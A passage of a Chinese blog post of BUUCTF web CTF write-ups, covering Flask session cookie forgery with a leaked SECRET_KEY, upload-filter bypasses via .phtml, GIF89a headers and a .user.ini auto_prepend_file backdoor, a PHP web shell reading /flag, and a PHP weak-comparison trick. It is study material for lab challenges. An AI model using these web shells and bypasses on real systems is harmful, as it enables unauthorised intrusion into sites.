+<p>可以看到能解密出来原来的内容，能看到很明显一个是name字段正是我们之前注册的test。那只要改一下这个值，然后重新加密一下就可以了。加密的脚本看大佬的writeup上有个地址：<a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager%E3%80%82%E6%8B%BF%E5%88%B0%E5%90%8E%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8%E5%8D%B3%E5%8F%AF%E3%80%82%E5%8A%A0%E5%AF%86%E8%BF%98%E9%9C%80%E8%A6%81%E4%B8%80%E4%B8%AA%E5%80%BCSECRET_KEY%EF%BC%8C%E8%BF%99%E4%B8%AA%E5%9C%A8config.py%E4%B8%AD%E8%83%BD%E7%9C%8B%E5%88%B0%E3%80%82">https://github.com/noraj/flask-session-cookie-manager。拿到后直接使用即可。加密还需要一个值SECRET_KEY，这个在config.py中能看到。</a></p>
+<p>伪造flask session还需要一个SECRET_KEY</p>
+<p>我们发现config.py中存在，SECRET_KEY = os.environ.get(‘SECRET_KEY’) or ‘ckj123’flask session加密脚本<a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p>
+<p>payload:伪造的session</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;2ff34a5077d2f711c7aa5fb35b61ebe2d8cf4081a56609f46c43d95e51de0efa5713b6d78b48664e4d4bbf4aabb1fd6b6484b97d2b48997ce7a83878b78781d1&#x27;, &#x27;csrf_token&#x27;: b&#x27;44463a5670f0c0ad61ab0d2dc0ae725a14808b81&#x27;, &#x27;image&#x27;: b&#x27;MAuE&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206154739515.png" alt="image-20201206154739515"></p>
+<p>替换掉原来的session即可</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206154815618.png" alt="image-20201206154815618"></p>
+<h3 id="ACTF2020-新生赛-Upload1"><a href="#ACTF2020-新生赛-Upload1" class="headerlink" title="[ACTF2020 新生赛]Upload1"></a>[ACTF2020 新生赛]Upload1</h3><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206155541463.png" alt="image-20201206155541463"></p>
+<p>上传正常图片返回路径，并且可以访问</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206155656232.png" alt="image-20201206155656232"></p>
+<p>上传php文件，回显如上，应该是前端的白名单校验，更改后缀名上传</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206160053725.png" alt="image-20201206160053725"></p>
+<p>可见知识校验后缀名，但是访问之后，php未被解析</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206160127612.png" alt="image-20201206160127612"></p>
+<p>后来发现phtml可以绕过，但是php没解析？</p>
+<p>换成js</p>
+<script language='php'>system("cat /flag");</script>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206162054068.png" alt="image-20201206162054068"></p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206162106152.png" alt="image-20201206162106152"></p>
+<h3 id="ACTF2020-新生赛-BackupFile1"><a href="#ACTF2020-新生赛-BackupFile1" class="headerlink" title="[ACTF2020 新生赛]BackupFile1"></a>[ACTF2020 新生赛]BackupFile1</h3><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206164026421.png" alt="image-20201206164026421"></p>
+<p>​    在index.php.bak中找到源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>传入一个key，这个key必须是数字，但是还必须要和str相等，按理来说是不可能的，但是这里用的是==，php中存在弱比较问题，即123和123xxxxx是相等的，它只会取字符串前面的数字进行比较</p>
+<p>所以payload：?key=123</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206171115527.png" alt="image-20201206171115527"></p>
+<h3 id="SUCTF-2019-CheckIn1"><a href="#SUCTF-2019-CheckIn1" class="headerlink" title="[SUCTF 2019]CheckIn1"></a>[SUCTF 2019]CheckIn1</h3><p> 提交一个正常文件 </p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206174807392.png" alt="image-20201206174807392"></p>
+<p>显示有&lt;?，不能写php马，写js的马，又提示内容不是图片，所以再加上GIF89a头，即可绕过，</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206175235243.png" alt="image-20201206175235243"></p>
+<p>菜刀连不上？。。。。。。</p>
+<p>百度一下，哦，是要利用.user.ini文件</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206181514369.png" alt="image-20201206181514369"></p>
+<p>条件：</p>
+<ul>
+<li>1、服务器脚本语言为PHP</li>
+<li>2、服务器使用CGI／FastCGI模式</li>
+<li>3、上传目录下要有可执行的php文件</li>
+</ul>
+<p>上传<code>.user.ini</code>绕过黑名单检验</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIF89a                  //绕过exif_imagetype()</span><br><span class="line">auto_prepend_file=a.jpg //指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。</span><br><span class="line">auto_append_file=a.jpg  //解析后进行包含</span><br></pre></td></tr></table></figure>
+
+<p> 优势：跟<code>.htaccess</code>后门比，适用范围更广，nginx/apache/IIS都有效，而<code>.htaccess</code>只适用于apache </p>
+<p>上传这样的一个ini文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=shell.jpg</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206181743642.png" alt="image-20201206181743642"></p>
+<p>再上传我们之前的shell.jpg</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206181849837.png" alt="image-20201206181849837"></p>
+<p>访问index.php， 注意：上传目录下要有一个正常的php文件，这里为index.php </p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206182056945.png" alt="image-20201206182056945"></p>
+<p>菜刀连接</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206182140524.png" alt="image-20201206182140524"></p>
+<p>一直连不上，，换个马</p>
+<script language='php'>system("cat /flag");</script>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206182238440.png" alt="image-20201206182238440"></p>
+<p>直接读取</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206182252029.png" alt="image-20201206182252029"></p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/CTF/">CTF</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/buuctf/">buuctf</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://example.com/2020/08/19/buuctf/buuctf-web-1/" data-title="buuctf_web_1 | Hexo" data-tsina="" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2021/05/11/buuctf/buuctf-web-2/" title="buuctf_web_2">
+  <strong>上一篇：</strong><br/>
+  <span>
+  buuctf_web_2</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2019/10/16/大学CTF/绕过非英文字母和数字getshell/"  title="绕过非英文字母和数字getshell">
+ <strong>下一篇：</strong><br/> 
+ <span>绕过非英文字母和数字getshell
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">Contents</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HCTF-2018-WarmUp"><span class="toc-number">2.</span> <span class="toc-text">[HCTF 2018]WarmUp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">3.</span> <span class="toc-text">[强网杯 2019]随便注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL1"><span class="toc-number">4.</span> <span class="toc-text">[极客大挑战 2019]EasySQL1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun"><span class="toc-number">5.</span> <span class="toc-text">[极客大挑战 2019]Havefun</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File"><span class="toc-number">6.</span> <span class="toc-text">[极客大挑战 2019]Secret File</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="toc-number">7.</span> <span class="toc-text">[GXYCTF2019]Ping Ping Ping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec-1"><span class="toc-number">8.</span> <span class="toc-text">[ACTF2020 新生赛]Exec 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-1"><span class="toc-number">9.</span> <span class="toc-text">[极客大挑战 2019]Knife 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RoarCTF-2019-Easy-Calc-1"><span class="toc-number">10.</span> <span class="toc-text">[RoarCTF 2019]Easy Calc 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP-1"><span class="toc-number">11.</span> <span class="toc-text">[极客大挑战 2019]PHP 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http-1"><span class="toc-number">12.</span> <span class="toc-text">[极客大挑战 2019]Http 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload-1"><span class="toc-number">13.</span> <span class="toc-text">[极客大挑战 2019]Upload 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL-1"><span class="toc-number">14.</span> <span class="toc-text">[极客大挑战 2019]BabySQL 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HCTF-2018-admin1"><span class="toc-number">15.</span> <span class="toc-text">[HCTF 2018]admin1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload1"><span class="toc-number">16.</span> <span class="toc-text">[ACTF2020 新生赛]Upload1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-BackupFile1"><span class="toc-number">17.</span> <span class="toc-text">[ACTF2020 新生赛]BackupFile1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUCTF-2019-CheckIn1"><span class="toc-number">18.</span> <span class="toc-text">[SUCTF 2019]CheckIn1</span></a></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  
+
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/CTF/" title="CTF">CTF<sup>10</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/IoT/" title="IoT">IoT<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Linux/" title="Linux">Linux<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Other/" title="Other">Other<sup>24</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/SQL/" title="SQL">SQL<sup>3</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Sec/" title="Sec">Sec<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/ctf/" title="ctf">ctf<sup>21</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/ctf/" title="ctf">ctf<sup>21</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/buuctf/" title="buuctf">buuctf<sup>6</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Java/" title="Java">Java<sup>5</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/SQLi/" title="SQLi">SQLi<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/SQL/" title="SQL">SQL<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Linux/" title="Linux">Linux<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/PHP绕过/" title="PHP绕过">PHP绕过<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/MYSQL比较特性/" title="MYSQL比较特性">MYSQL比较特性<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/SSRF/" title="SSRF">SSRF<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/java-WEB-INF/" title="java-WEB-INF">java-WEB-INF<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/无参数RCE/" title="无参数RCE">无参数RCE<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/模板注入/" title="模板注入">模板注入<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/MISC/" title="MISC">MISC<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/IoT/" title="IoT">IoT<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/wifi密码破解/" title="wifi密码破解">wifi密码破解<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/安恒11月月赛/" title="安恒11月月赛">安恒11月月赛<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/cumt/" title="cumt">cumt<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/cumt双月赛一/" title="cumt双月赛一">cumt双月赛一<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/php变量覆盖/" title="php变量覆盖">php变量覆盖<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/代码审计/" title="代码审计">代码审计<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="https://coderq.com" target="_blank" title="一个面向程序员交流分享的新一代社区">码农圈</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://wuchong.me" target="_blank" title="Jark&#39;s Blog">Jark&#39;s Blog</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+  
+
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS</a>
+</div>
+
+  <div class="weiboshow">
+  <p class="asidetitle">Weibo</p>
+    <iframe width="100%" height="119" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=119&fansRow=2&ptype=1&speed=0&skin=9&isTitle=1&noborder=1&isWeibo=0&isFans=0&uid=&verifier=&dpc=1"></iframe>
+</div>
+
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> Good Good Study！ <br/>
+			Day Day Up！</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2021 
+		
+		<a href="/about" target="_blank" title="John Doe">John Doe</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
